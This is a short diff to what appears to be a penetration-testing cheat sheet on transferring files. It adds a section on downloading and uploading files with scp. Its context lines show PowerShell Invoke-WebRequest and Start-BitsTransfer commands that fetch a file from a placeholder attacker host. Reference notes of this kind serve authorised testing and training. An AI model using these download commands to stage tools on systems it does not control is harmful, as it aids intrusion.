@@ -27,3 +27,15 @@ or
 Invoke-WebRequest http://$attacker_address$/$filename$ -O $output-filename$
 
 powershell.exe -c (Start-BitsTransfer -Source "http://$attacker_ip$/$filename$ -Destination C:\temp\$filename$")
+
+### SSH
+
+If you have an SSH session you can use SCP command to download files. To download/upload directories use the -r (recursive) switch
+
+Downloading files from the host:
+
+scp username@from_host:file.txt /local/directory/
+
+Uploading files to the host:
+
+scp file.txt username@to_host:/remote/directory/
